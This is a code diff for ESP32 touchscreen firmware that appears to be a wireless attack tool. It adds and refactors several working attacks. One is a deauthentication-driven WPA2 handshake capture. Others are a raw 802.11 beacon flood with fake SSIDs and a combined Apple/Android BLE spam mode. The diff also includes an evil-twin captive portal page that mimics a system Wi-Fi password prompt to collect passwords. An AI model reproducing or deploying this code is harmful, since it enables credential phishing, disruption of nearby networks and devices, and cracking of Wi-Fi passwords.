-  for (int row = 0; row < 4; row++) {
-    for (int col = 0; col < 10; col++) {
-      int keyX = SIDE_MARGIN + (col * (keyW + keySpacing));
-      int keyYPos = keyY + (row * (keyH + keySpacing));
-      
-      if (x >= keyX && x <= keyX + keyW && y >= keyYPos && y <= keyYPos + keyH) {
-        if (beaconInputSSID.length() < 32) {
-          beaconInputSSID += keyboard[row][col];
-          drawBeaconAddScreen();
-        }
-        return;
-      }
-    }
-  }
-  
-  int controlY = keyY + (4 * (keyH + keySpacing)) + 5;
-  
-  // BACKSPACE
-  if (x >= SIDE_MARGIN && x <= SIDE_MARGIN + 70 && y >= controlY && y <= controlY + 25) {
-    if (beaconInputSSID.length() > 0) {
-      beaconInputSSID.remove(beaconInputSSID.length() - 1);
-      drawBeaconAddScreen();
-    }
-    return;
-  }
-  
-  // SAVE
-  if (x >= SIDE_MARGIN + 75 && x <= SIDE_MARGIN + 145 && y >= controlY && y <= controlY + 25) {
-    if (beaconInputSSID.length() > 0 && customBeaconCount < 20) {
-      customBeacons[customBeaconCount] = beaconInputSSID;
-      customBeaconCount++;
-      addToConsole("Added: " + beaconInputSSID);
-      beaconInputSSID = "";
-      currentState = BEACON_MANAGER;
-      drawBeaconManager();
-    }
-    return;
-  }
-  
-  // CANCEL
-  if (x >= SIDE_MARGIN + 150 && x <= SIDE_MARGIN + 220 && y >= controlY && y <= controlY + 25) {
-    beaconInputSSID = "";
-    currentState = BEACON_MANAGER;
-    drawBeaconManager();
-    return;
-  }
-}
-
-void deleteBeacon(int index) {
-  if (index < 0 || index >= customBeaconCount) return;
-  
-  addToConsole("Deleted: " + customBeacons[index]);
-  
-  // Shift array
-  for (int i = index; i < customBeaconCount - 1; i++) {
-    customBeacons[i] = customBeacons[i + 1];
-  }
-  customBeaconCount--;
-  
-  // Adjust scroll if needed
-  if (beaconDisplayOffset >= customBeaconCount && beaconDisplayOffset > 0) {
-    beaconDisplayOffset -= MAX_DISPLAY_BEACONS;
-    if (beaconDisplayOffset < 0) beaconDisplayOffset = 0;
-  }
-}
-
 void handleSnifferMenuTouch(int x, int y) {
+  // Back button
   if (y > 300 && currentState == SNIFFER_MENU) {
     currentState = MAIN_MENU;
     hoveredIndex = -1;
@@ -3703,51 +3925,43 @@ void handleSnifferMenuTouch(int x, int y) {
     return;
   }
   
+  // Sniffer is active - handle scrolling and stop
   if (currentState == SNIFFER_ACTIVE) {
-    int listY = HEADER_HEIGHT + 35;
-    int visiblePackets = 8;
     int totalPackets = min((uint32_t)MAX_SNIFFER_PACKETS, packetCount);
+    const int PACKETS_PER_PAGE = 11;
+    int totalPages = (totalPackets + PACKETS_PER_PAGE - 1) / PACKETS_PER_PAGE;
     
-    if (y > listY + (visiblePackets * 26)) {
+    if (y > 300) {
+      // Stop button
       stopSniffer();
       currentState = SNIFFER_MENU;
       drawSnifferMenu();
+    } else if (y > 280) {
+      // Footer area - ignore
       return;
-    }
-    
-    if (y > listY && y < listY + (visiblePackets * 26)) {
-      return;
-    }
-    
-    if (y > SCREEN_HEIGHT - 140 && y < SCREEN_HEIGHT - 100 && 
-        snifferScrollOffset + visiblePackets < totalPackets) {
-      snifferScrollOffset += visiblePackets;
+    } else if (totalPages > 1) {
+      // Scroll through pages
+      int currentPage = snifferScrollOffset / PACKETS_PER_PAGE;
+      currentPage = (currentPage + 1) % totalPages;
+      snifferScrollOffset = currentPage * PACKETS_PER_PAGE;
       displaySnifferActive();
-      return;
     }
-    
-    if (y > SCREEN_HEIGHT - 180 && y < SCREEN_HEIGHT - 140 && snifferScrollOffset > 0) {
-      snifferScrollOffset -= visiblePackets;
-      if (snifferScrollOffset < 0) snifferScrollOffset = 0;
-      displaySnifferActive();
-      return;
-    }
-    
     return;
   }
   
+  // Menu interaction
   int startY = HEADER_HEIGHT + 10;
   int buttonIndex = getTouchedButtonIndex(y, startY);
   
   if (buttonIndex < 0 || buttonIndex > 1) return;
   
   switch (buttonIndex) {
-    case 0:
+    case 0:  // Start Sniffer
       snifferScrollOffset = 0;
       packetHistoryIndex = 0;
       startSniffer();
       break;
-    case 1:
+    case 1:  // Stop Sniffer
       stopSniffer();
       drawSnifferMenu();
       break;
@@ -3900,7 +4114,7 @@ void handleSpamMenuTouch(int x, int y) {
   
   int startY = HEADER_HEIGHT + 10;
   
-  if (y >= startY && y < startY + (2 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
+  if (y >= startY && y < startY + (3 * (MENU_ITEM_HEIGHT + MENU_SPACING))) {
     int relativeY = y - startY;
     int buttonIndex = relativeY / (MENU_ITEM_HEIGHT + MENU_SPACING);
     
@@ -3922,6 +4136,16 @@ void handleSpamMenuTouch(int x, int y) {
             if (appleSpamActive) stopAppleSpam();
             startAndroidSpam();
           } else {
+            stopAndroidSpam();
+          }
+          drawSpamMenu();
+          break;
+          
+        case 2:  // Combined Spam
+          if (!appleSpamActive || !androidSpamActive) {
+            startCombinedSpam();
+          } else {
+            stopAppleSpam();
             stopAndroidSpam();
           }
           drawSpamMenu();
@@ -4317,8 +4541,14 @@ void loop() {
   
   // BLE Spam (only if nothing else active)
   if (!nrfJammerActive && !bleJammerActive) {
-    if (appleSpamActive) performAppleSpam();
-    if (androidSpamActive) performAndroidSpam();
+    if (appleSpamActive && androidSpamActive) {
+      // Combined spam mode
+      performCombinedSpam();
+    } else {
+      // Individual spam modes
+      if (appleSpamActive) performAppleSpam();
+      if (androidSpamActive) performAndroidSpam();
+    }
   }
   
   // Captive portal (when not jamming)
@@ -4729,11 +4959,9 @@ void startHandshakeCapture() {
 }
 
 void displayHandshakeCapture() {
-  // Only do full redraw if needed
   static bool needsFullRedraw = true;
   static bool lastCapturedState = false;
   
-  // Full redraw when state changes or first time
   if (needsFullRedraw || (capturedHandshake.captured != lastCapturedState)) {
     tft.fillScreen(COLOR_BG);
     drawTerminalHeader("handshake capture");
@@ -4741,27 +4969,27 @@ void displayHandshakeCapture() {
     lastCapturedState = capturedHandshake.captured;
   }
   
-  // Live indicator (always update)
+  // Live indicator
   static bool blink = false;
   blink = !blink;
   tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
   
-  int y = HEADER_HEIGHT + 15;
+  int y = HEADER_HEIGHT + 10;
   
-  // Clear dynamic area
-  tft.fillRect(0, y, 240, 200, COLOR_BG);
+  // Clear dynamic area only
+  tft.fillRect(0, y, 240, 270, COLOR_BG);
   
-  // Target info
+  // Target info - compact
   tft.setTextSize(1);
   tft.setTextColor(COLOR_DARK_GREEN);
   tft.setCursor(SIDE_MARGIN, y);
-  tft.print("[*] Target: ");
+  tft.print("Target: ");
   tft.setTextColor(COLOR_YELLOW);
   String truncSSID = selectedSSID;
-  if (truncSSID.length() > 20) truncSSID = truncSSID.substring(0, 19) + "~";
-  tft.println(truncSSID);
+  if (truncSSID.length() > 18) truncSSID = truncSSID.substring(0, 17) + "~";
+  tft.print(truncSSID);
   
-  y += 20;
+  // Channel on same line
   int targetIndex = -1;
   for (int i = 0; i < networkCount; i++) {
     if (networks[i].ssid == selectedSSID) {
@@ -4772,21 +5000,22 @@ void displayHandshakeCapture() {
   
   if (targetIndex != -1) {
     tft.setTextColor(COLOR_DARK_GREEN);
-    tft.setCursor(SIDE_MARGIN, y);
-    tft.print("[*] Channel: ");
+    tft.print(" Ch");
     tft.setTextColor(COLOR_CYAN);
     tft.printf("%d", networks[targetIndex].channel);
   }
   
-  y += 25;
+  y += 18;
   tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
-  y += 10;
+  y += 8;
   
-  // Deauth status (LIVE)
-  tft.setTextColor(COLOR_DARK_GREEN);
+  // Deauth stats - compact
+  tft.setTextColor(COLOR_TEXT);
   tft.setCursor(SIDE_MARGIN, y);
-  tft.print("[*] Deauth packets: ");
+  tft.print("Deauth:");
+  
   tft.setTextColor(COLOR_ORANGE);
+  tft.setCursor(55, y);
   tft.printf("%d", deauthPacketsSent);
   
   // Packets per second
@@ -4798,13 +5027,17 @@ void displayHandshakeCapture() {
     lastPktCount = deauthPacketsSent;
     lastPktTime = millis();
   }
-  tft.setTextColor(COLOR_CYAN);
-  tft.printf(" (%d/s)", packetsPerSec);
   
-  y += 20;
-  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setTextColor(COLOR_CYAN);
+  tft.setCursor(100, y);
+  tft.printf("(%d/s)", packetsPerSec);
+  
+  y += 18;
+  
+  // Handshake status
+  tft.setTextColor(COLOR_TEXT);
   tft.setCursor(SIDE_MARGIN, y);
-  tft.print("[*] Handshake: ");
+  tft.print("Handshake: ");
   
   if (capturedHandshake.captured) {
     // BLINK EFFECT when captured
@@ -4812,87 +5045,80 @@ void displayHandshakeCapture() {
     if (captureBlinkTime == 0) captureBlinkTime = millis();
     
     bool showText = true;
-    if (millis() - captureBlinkTime < 5000) {  // Blink for 5 seconds
+    if (millis() - captureBlinkTime < 5000) {
       showText = (millis() / 200) % 2 == 0;
     }
     
     if (showText) {
       tft.setTextColor(COLOR_GREEN);
-      tft.println("CAPTURED!");
-    } else {
-      tft.setTextColor(COLOR_BG);
-      tft.println("          ");
-      y -= 12;  // Adjust for next line
+      tft.print("CAPTURED!");
     }
     
     y += 20;
-    tft.setTextColor(COLOR_TEXT);
-    tft.setCursor(SIDE_MARGIN + 10, y);
-    tft.print("AP MAC: ");
+    tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
+    y += 8;
+    
+    // MAC addresses - compact format
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.setCursor(SIDE_MARGIN, y);
+    tft.print("AP:");
     tft.setTextColor(COLOR_CYAN);
+    tft.setCursor(30, y);
     tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
                capturedHandshake.apMAC[0], capturedHandshake.apMAC[1],
                capturedHandshake.apMAC[2], capturedHandshake.apMAC[3],
                capturedHandshake.apMAC[4], capturedHandshake.apMAC[5]);
     
     y += 15;
-    tft.setTextColor(COLOR_TEXT);
-    tft.setCursor(SIDE_MARGIN + 10, y);
-    tft.print("Client: ");
+    tft.setTextColor(COLOR_DARK_GREEN);
+    tft.setCursor(SIDE_MARGIN, y);
+    tft.print("CL:");
     tft.setTextColor(COLOR_CYAN);
+    tft.setCursor(30, y);
     tft.printf("%02X:%02X:%02X:%02X:%02X:%02X", 
                capturedHandshake.clientMAC[0], capturedHandshake.clientMAC[1],
                capturedHandshake.clientMAC[2], capturedHandshake.clientMAC[3],
                capturedHandshake.clientMAC[4], capturedHandshake.clientMAC[5]);
     
-    y += 25;
+    y += 20;
     tft.setTextColor(COLOR_GREEN);
     tft.setCursor(SIDE_MARGIN, y);
     tft.println("Ready to validate passwords!");
     
   } else {
     tft.setTextColor(COLOR_YELLOW);
-    tft.println("WAITING...");
+    tft.print("WAITING...");
     
-    // Animated waiting message
     y += 20;
     tft.setTextColor(COLOR_TEXT);
-    tft.setCursor(SIDE_MARGIN + 10, y);
-    tft.print("Forcing deauth to trigger");
+    tft.setCursor(SIDE_MARGIN, y);
+    tft.print("Forcing 4-way handshake");
     
+    // Animated dots
     int dots = (millis() / 500) % 4;
     for (int i = 0; i < 3; i++) {
       tft.print(i < dots ? "." : " ");
     }
-    
-    y += 12;
-    tft.setCursor(SIDE_MARGIN + 10, y);
-    tft.print("4-way handshake");
-    for (int i = 0; i < 3; i++) {
-      tft.print(i < dots ? "." : " ");
-    }
   }
   
-  y += 30;
+  y += 25;
   tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
-  y += 10;
+  y += 8;
   
-  // Duration (LIVE)
-  tft.setTextColor(COLOR_DARK_GREEN);
+  // Duration
+  tft.setTextColor(COLOR_TEXT);
   tft.setCursor(SIDE_MARGIN, y);
   tft.print("Duration: ");
-  tft.setTextColor(COLOR_TEXT);
   unsigned long runtime = (millis() - lastAttackTime) / 1000;
+  tft.setTextColor(COLOR_CYAN);
   tft.printf("%d sec", runtime);
   
-  // Instructions
-  tft.setTextColor(COLOR_DARK_GREEN);
-  tft.setCursor(30, 285);
-  if (capturedHandshake.captured) {
-    tft.print("Tap to return to menu");
-  } else {
-    tft.print("Tap to stop & return");
-  }
+  // ✅ FIXED: Consistent stop button style
+  int backY = 305;
+  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
+  tft.setTextColor(COLOR_RED);
+  tft.setCursor(75, backY + 3);
+  tft.print("[TAP] Stop");
 }
 
 void performBeaconFlood() {
@@ -4902,6 +5128,14 @@ void performBeaconFlood() {
   static int beaconIndex = 0;
   static uint8_t channel = 1;
   static unsigned long lastChannelHop = 0;
+  static unsigned long lastBeacon = 0;
+  
+  // ✅ FIX 1: Rate limiting to prevent crash (max 10 beacons/sec)
+  if (millis() - lastBeacon < 100) return;
+  lastBeacon = millis();
+  
+  // ✅ FIX 2: Watchdog reset
+  esp_task_wdt_reset();
   
   if (!initialized) {
     // Stop any existing WiFi first
@@ -4933,108 +5167,94 @@ void performBeaconFlood() {
   String fakeSSID = customBeacons[beaconIndex];
   beaconIndex = (beaconIndex + 1) % customBeaconCount;
   
+  // ✅ FIX 3: Length validation
+  if (fakeSSID.length() == 0 || fakeSSID.length() > 32) {
+    return;  // Skip invalid SSID
+  }
+  
   // Create proper beacon frame
   uint8_t beaconPacket[200];
   int packetSize = 0;
   
   // === 802.11 MAC Header ===
-  beaconPacket[0] = 0x80;  // Frame Control: Type=Management, Subtype=Beacon
-  beaconPacket[1] = 0x00;  // Frame Control Flags
+  beaconPacket[0] = 0x80;
+  beaconPacket[1] = 0x00;
   
   // Duration
   beaconPacket[2] = 0x00;
   beaconPacket[3] = 0x00;
   
   // Destination address (broadcast)
-  beaconPacket[4] = 0xFF;
-  beaconPacket[5] = 0xFF;
-  beaconPacket[6] = 0xFF;
-  beaconPacket[7] = 0xFF;
-  beaconPacket[8] = 0xFF;
-  beaconPacket[9] = 0xFF;
+  for (int i = 4; i < 10; i++) beaconPacket[i] = 0xFF;
   
   // Source address (random MAC)
-  beaconPacket[10] = random(0, 256);
-  beaconPacket[11] = random(0, 256);
-  beaconPacket[12] = random(0, 256);
-  beaconPacket[13] = random(0, 256);
-  beaconPacket[14] = random(0, 256);
-  beaconPacket[15] = random(0, 256);
+  for (int i = 10; i < 16; i++) beaconPacket[i] = random(0, 256);
   
   // BSSID (same as source)
-  beaconPacket[16] = beaconPacket[10];
-  beaconPacket[17] = beaconPacket[11];
-  beaconPacket[18] = beaconPacket[12];
-  beaconPacket[19] = beaconPacket[13];
-  beaconPacket[20] = beaconPacket[14];
-  beaconPacket[21] = beaconPacket[15];
+  for (int i = 16; i < 22; i++) beaconPacket[i] = beaconPacket[i - 6];
   
   // Sequence number
   beaconPacket[22] = 0x00;
   beaconPacket[23] = 0x00;
   
   // === Beacon Frame Body ===
-  
-  // Timestamp (8 bytes)
   uint64_t timestamp = esp_timer_get_time();
   memcpy(&beaconPacket[24], &timestamp, 8);
   
-  // Beacon interval (100 TU = 102.4ms)
-  beaconPacket[32] = 0x64;  // 100 TU
+  beaconPacket[32] = 0x64;  // Beacon interval
   beaconPacket[33] = 0x00;
   
-  // Capability info (ESS bit set = infrastructure mode)
-  beaconPacket[34] = 0x01;  // ESS
+  beaconPacket[34] = 0x01;  // Capability
   beaconPacket[35] = 0x00;
   
   packetSize = 36;
   
   // === Information Elements ===
-  
-  // SSID element (Tag 0)
-  beaconPacket[packetSize++] = 0x00;  // Tag: SSID
-  beaconPacket[packetSize++] = fakeSSID.length();  // Length
+  beaconPacket[packetSize++] = 0x00;  // SSID tag
+  beaconPacket[packetSize++] = fakeSSID.length();
   memcpy(&beaconPacket[packetSize], fakeSSID.c_str(), fakeSSID.length());
   packetSize += fakeSSID.length();
   
-  // Supported rates (Tag 1) - 802.11b/g rates
-  beaconPacket[packetSize++] = 0x01;  // Tag: Supported Rates
-  beaconPacket[packetSize++] = 0x08;  // Length: 8 rates
-  beaconPacket[packetSize++] = 0x82;  // 1 Mbps (basic)
-  beaconPacket[packetSize++] = 0x84;  // 2 Mbps (basic)
-  beaconPacket[packetSize++] = 0x8B;  // 5.5 Mbps (basic)
-  beaconPacket[packetSize++] = 0x96;  // 11 Mbps (basic)
-  beaconPacket[packetSize++] = 0x24;  // 18 Mbps
-  beaconPacket[packetSize++] = 0x30;  // 24 Mbps
-  beaconPacket[packetSize++] = 0x48;  // 36 Mbps
-  beaconPacket[packetSize++] = 0x6C;  // 54 Mbps
+  // Supported rates
+  beaconPacket[packetSize++] = 0x01;
+  beaconPacket[packetSize++] = 0x08;
+  beaconPacket[packetSize++] = 0x82;
+  beaconPacket[packetSize++] = 0x84;
+  beaconPacket[packetSize++] = 0x8B;
+  beaconPacket[packetSize++] = 0x96;
+  beaconPacket[packetSize++] = 0x24;
+  beaconPacket[packetSize++] = 0x30;
+  beaconPacket[packetSize++] = 0x48;
+  beaconPacket[packetSize++] = 0x6C;
   
-  // DS Parameter Set (Tag 3) - Current channel
-  beaconPacket[packetSize++] = 0x03;  // Tag: DS Parameter
-  beaconPacket[packetSize++] = 0x01;  // Length
-  beaconPacket[packetSize++] = channel;  // Current channel
+  // DS Parameter
+  beaconPacket[packetSize++] = 0x03;
+  beaconPacket[packetSize++] = 0x01;
+  beaconPacket[packetSize++] = channel;
   
-  // Traffic Indication Map (Tag 5) - TIM
-  beaconPacket[packetSize++] = 0x05;  // Tag: TIM
-  beaconPacket[packetSize++] = 0x04;  // Length
-  beaconPacket[packetSize++] = 0x00;  // DTIM Count
-  beaconPacket[packetSize++] = 0x01;  // DTIM Period
-  beaconPacket[packetSize++] = 0x00;  // Bitmap Control
-  beaconPacket[packetSize++] = 0x00;  // Partial Virtual Bitmap
+  // TIM
+  beaconPacket[packetSize++] = 0x05;
+  beaconPacket[packetSize++] = 0x04;
+  beaconPacket[packetSize++] = 0x00;
+  beaconPacket[packetSize++] = 0x01;
+  beaconPacket[packetSize++] = 0x00;
+  beaconPacket[packetSize++] = 0x00;
   
-  // Send the beacon frame
-  esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, false);
+  // ✅ FIX 4: Validate packet size before sending
+  if (packetSize > 0 && packetSize < 200) {
+    esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, packetSize, false);
+  }
   
   // Channel hopping (every 50 beacons)
   static int beaconCount = 0;
   beaconCount++;
   if (beaconCount % 50 == 0) {
-    channel = (channel % 13) + 1;  // Channels 1-13
+    channel = (channel % 13) + 1;
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
   }
   
-  // Small delay to prevent flooding too fast
-  delayMicroseconds(100);
+  // ✅ FIX 5: Delay to prevent overwhelming
+  delay(10);
   
   if (!beaconFloodActive) {
     initialized = false;
@@ -5164,36 +5384,43 @@ void stopCaptivePortal() {
 void handlePortalRoot() {
   String html = "<!DOCTYPE html><html><head>";
   html += "<title>Wi-Fi Login</title>";
-  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
+  html += "<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no'>";
   html += "<meta http-equiv='Cache-Control' content='no-cache, no-store, must-revalidate'>";
   html += "<style>";
+  html += "*{margin:0;padding:0;box-sizing:border-box;}";
   html += "body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;";
-  html += "background:#e5e5e5;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}";
-  html += ".container{background:#f0f0f0;padding:0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);max-width:500px;width:100%;}";
-  html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:20px;border-radius:12px 12px 0 0;";
-  html += "display:flex;align-items:center;gap:20px;border-bottom:1px solid #b0b0b0;}";
-  html += ".wifi-icon{width:70px;height:70px;display:flex;align-items:center;justify-content:center;}";
-  html += ".wifi-icon svg{width:60px;height:60px;}";
-  html += ".header-text{flex:1;}";
-  html += ".network-name{font-size:17px;font-weight:600;color:#000;margin:0 0 4px 0;}";
-  html += ".network-info{font-size:13px;color:#505050;margin:0;}";
-  html += ".content{padding:24px 30px 30px;}";
-  html += ".form-group{margin-bottom:20px;}";
-  html += "label{display:block;color:#000;font-size:13px;font-weight:500;margin-bottom:8px;text-align:right;display:flex;";
-  html += "align-items:center;gap:10px;}";
-  html += "label span{min-width:80px;text-align:right;}";
-  html += "input[type='password']{flex:1;padding:8px 12px;border:2px solid #a0a0a0;border-radius:6px;box-sizing:border-box;";
-  html += "font-size:15px;background:#fff;}";
+  html += "background:#e5e5e5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:10px;}";
+  html += ".container{background:#f0f0f0;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.15);";
+  html += "width:100%;max-width:450px;}";
+  html += ".header{background:linear-gradient(180deg,#d8d8d8 0%,#c8c8c8 100%);padding:15px;";
+  html += "border-radius:12px 12px 0 0;display:flex;align-items:center;gap:15px;border-bottom:1px solid #b0b0b0;}";
+  html += ".wifi-icon{min-width:50px;width:50px;height:50px;display:flex;align-items:center;justify-content:center;}";
+  html += ".wifi-icon svg{width:100%;height:100%;}";
+  html += ".header-text{flex:1;min-width:0;}";
+  html += ".network-name{font-size:15px;font-weight:600;color:#000;margin:0 0 4px 0;word-wrap:break-word;}";
+  html += ".network-info{font-size:12px;color:#505050;margin:0;}";
+  html += ".content{padding:20px;}";
+  html += ".form-group{margin-bottom:15px;}";
+  html += "label{display:flex;flex-direction:column;color:#000;font-size:13px;font-weight:500;margin-bottom:8px;}";
+  html += "@media (min-width: 400px){label{flex-direction:row;align-items:center;gap:10px;}}";
+  html += "label span{min-width:80px;text-align:left;}";
+  html += "@media (min-width: 400px){label span{text-align:right;}}";
+  html += "input[type='password']{flex:1;padding:10px 12px;border:2px solid #a0a0a0;border-radius:6px;";
+  html += "font-size:16px;background:#fff;width:100%;-webkit-appearance:none;}";
   html += "input[type='password']:focus{outline:none;border-color:#007AFF;box-shadow:0 0 0 3px rgba(0,122,255,0.2);}";
-  html += ".checkbox-group{display:flex;align-items:center;gap:8px;margin-bottom:12px;padding-left:90px;}";
-  html += "input[type='checkbox']{width:18px;height:18px;cursor:pointer;accent-color:#007AFF;}";
+  html += ".checkbox-group{display:flex;align-items:center;gap:8px;margin-bottom:12px;padding-left:0;}";
+  html += "@media (min-width: 400px){.checkbox-group{padding-left:90px;}}";
+  html += "input[type='checkbox']{width:18px;height:18px;cursor:pointer;accent-color:#007AFF;flex-shrink:0;}";
   html += ".checkbox-label{font-size:13px;color:#000;user-select:none;cursor:pointer;}";
-  html += ".footer{display:flex;justify-content:space-between;align-items:center;padding:16px 30px;";
-  html += "background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;}";
+  html += ".footer{display:flex;justify-content:space-between;align-items:center;padding:12px 20px;";
+  html += "background:linear-gradient(180deg,#e8e8e8 0%,#d8d8d8 100%);border-radius:0 0 12px 12px;border-top:1px solid #c0c0c0;";
+  html += "flex-wrap:wrap;gap:10px;}";
   html += ".help-btn{width:28px;height:28px;border-radius:50%;background:#fff;border:1px solid #a0a0a0;";
-  html += "color:#007AFF;font-size:16px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;}";
-  html += ".action-btns{display:flex;gap:10px;}";
-  html += ".btn{padding:8px 20px;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;border:1px solid;}";
+  html += "color:#007AFF;font-size:16px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;}";
+  html += ".action-btns{display:flex;gap:10px;flex:1;justify-content:flex-end;}";
+  html += "@media (max-width: 350px){.action-btns{width:100%;justify-content:space-between;}}";
+  html += ".btn{padding:8px 16px;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;border:1px solid;";
+  html += "white-space:nowrap;min-width:70px;text-align:center;}";
   html += ".btn-cancel{background:#fff;border-color:#a0a0a0;color:#000;}";
   html += ".btn-join{background:#007AFF;border-color:#007AFF;color:#fff;opacity:0.4;pointer-events:none;}";
   html += ".btn-join.active{opacity:1;pointer-events:auto;}";
@@ -5211,13 +5438,14 @@ void handlePortalRoot() {
   html += "</svg>";
   html += "</div>";
   html += "<div class='header-text'>";
-  html += "<h2 class='network-name'>The Wi-Fi network \"" + selectedSSID + "\" requires a WPA2 password.</h2>";
+  html += "<h2 class='network-name'>Enter password for \"" + selectedSSID + "\"</h2>";
+  html += "<p class='network-info'>WPA2 Protected Network</p>";
   html += "</div></div>";
   html += "<form action='/post' method='post' id='wifiForm'>";
   html += "<div class='content'>";
   html += "<div class='form-group'>";
   html += "<label><span>Password:</span>";
-  html += "<input type='password' name='password' id='password' required autofocus>";
+  html += "<input type='password' name='password' id='password' required autofocus autocomplete='off'>";
   html += "</label></div>";
   html += "<div class='checkbox-group'>";
   html += "<input type='checkbox' id='showPwd'>";
@@ -5275,95 +5503,151 @@ void stopSniffer() {
 
 void displaySnifferActive() {
   tft.fillScreen(COLOR_BG);
-  drawTerminalHeader("sniffer");
+  drawTerminalHeader("packet sniffer");
   
+  // Live indicator
+  static bool blink = false;
+  blink = !blink;
+  tft.fillCircle(220, 12, 3, blink ? COLOR_RED : COLOR_DARK_GREEN);
+  
+  // Stats bar - compact single line
   int statsY = HEADER_HEIGHT + 5;
   tft.setTextSize(1);
   tft.setTextColor(COLOR_TEXT);
   tft.setCursor(SIDE_MARGIN, statsY);
-  tft.printf("Ch:%d Total:%d", snifferChannel, packetCount);
+  tft.printf("Ch%d", snifferChannel);
   
-  tft.setCursor(SIDE_MARGIN, statsY + 12);
-  tft.setTextColor(COLOR_SUCCESS);
-  tft.printf("Beacon:%d ", beaconCount);
-  tft.setTextColor(COLOR_ACCENT);
-  tft.printf("Data:%d ", dataCount);
-  tft.setTextColor(COLOR_WARNING);
-  tft.printf("Deauth:%d", deauthCount);
+  tft.setTextColor(COLOR_CYAN);
+  tft.setCursor(45, statsY);
+  tft.printf("T:%d", packetCount);
   
-  int listY = HEADER_HEIGHT + 35;
-  tft.drawLine(0, listY - 2, SCREEN_WIDTH, listY - 2, COLOR_BORDER);
+  tft.setTextColor(COLOR_GREEN);
+  tft.setCursor(95, statsY);
+  tft.printf("B:%d", beaconCount);
   
-  int visiblePackets = 8;
-  int totalPackets = min((uint32_t)MAX_SNIFFER_PACKETS, packetCount);
+  tft.setTextColor(COLOR_YELLOW);
+  tft.setCursor(140, statsY);
+  tft.printf("D:%d", dataCount);
   
-  for (int i = 0; i < visiblePackets && (snifferScrollOffset + i) < totalPackets; i++) {
-    int idx = (packetHistoryIndex - 1 - snifferScrollOffset - i + MAX_SNIFFER_PACKETS) % MAX_SNIFFER_PACKETS;
-    
-    if (packetHistory[idx].timestamp == 0) continue;
-    
-    int y = listY + (i * 26);
-    
-    uint16_t typeColor = COLOR_TEXT;
-    const char* typeName = "UNK";
-    
-    if (packetHistory[idx].type == 0x80) {
-      typeColor = COLOR_SUCCESS;
-      typeName = "BCN";
-    } else if ((packetHistory[idx].type & 0x0C) == 0x08) {
-      typeColor = COLOR_ACCENT;
-      typeName = "DAT";
-    } else if (packetHistory[idx].type == 0xC0 || packetHistory[idx].type == 0xA0) {
-      typeColor = COLOR_WARNING;
-      typeName = "DEA";
-    } else if (packetHistory[idx].type == 0x40) {
-      typeColor = COLOR_PURPLE;
-      typeName = "PRB";
-    }
-    
-    tft.fillRect(SIDE_MARGIN, y, BUTTON_WIDTH, 24, COLOR_ITEM_BG);
-    tft.drawRect(SIDE_MARGIN, y, BUTTON_WIDTH, 24, COLOR_BORDER);
-    
-    tft.setTextColor(typeColor);
-    tft.setTextSize(1);
-    tft.setCursor(SIDE_MARGIN + 5, y + 5);
-    tft.print(typeName);
-    
-    int rssi = packetHistory[idx].rssi;
-    int barWidth = map(constrain(rssi, -100, -30), -100, -30, 5, 40);
-    uint16_t barColor = (rssi > -50) ? COLOR_SUCCESS : (rssi > -70) ? COLOR_WARNING : COLOR_CRITICAL;
-    tft.fillRect(SIDE_MARGIN + 5, y + 16, barWidth, 3, barColor);
-    
-    tft.setTextColor(COLOR_TEXT);
-    tft.setCursor(SIDE_MARGIN + 50, y + 13);
-    tft.printf("%ddBm", rssi);
-    
-    tft.setTextColor(COLOR_ACCENT);
-    tft.setCursor(SIDE_MARGIN + 100, y + 13);
-    tft.printf("Ch%d", packetHistory[idx].channel);
-    
-    unsigned long ago = (millis() - packetHistory[idx].timestamp) / 1000;
-    tft.setTextColor(COLOR_TEXT);
-    tft.setCursor(SIDE_MARGIN + 140, y + 13);
-    if (ago < 60) {
-      tft.printf("%ds", ago);
-    } else {
-      tft.printf("%dm", ago / 60);
-    }
-  }
+  tft.setTextColor(COLOR_RED);
+  tft.setCursor(185, statsY);
+  tft.printf("X:%d", deauthCount);
   
-  if (totalPackets > visiblePackets) {
-    tft.setTextColor(COLOR_PURPLE);
-    tft.setTextSize(1);
-    tft.setCursor(SCREEN_WIDTH / 2 - 40, listY + (visiblePackets * 26) + 5);
-    tft.printf("Scroll %d/%d", (snifferScrollOffset / visiblePackets) + 1, 
-               (totalPackets + visiblePackets - 1) / visiblePackets);
-  }
+  // Column headers
+  int listY = HEADER_HEIGHT + 22;
+  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
   
   tft.setTextSize(1);
-  tft.setTextColor(COLOR_ACCENT);
-  tft.setCursor(70, SCREEN_HEIGHT - 80);
-  tft.println("Tap to stop");
+  tft.setTextColor(COLOR_DARK_GREEN);
+  tft.setCursor(SIDE_MARGIN, listY);
+  tft.print("TYPE");
+  tft.setCursor(40, listY);
+  tft.print("RSSI");
+  tft.setCursor(80, listY);
+  tft.print("CH");
+  tft.setCursor(110, listY);
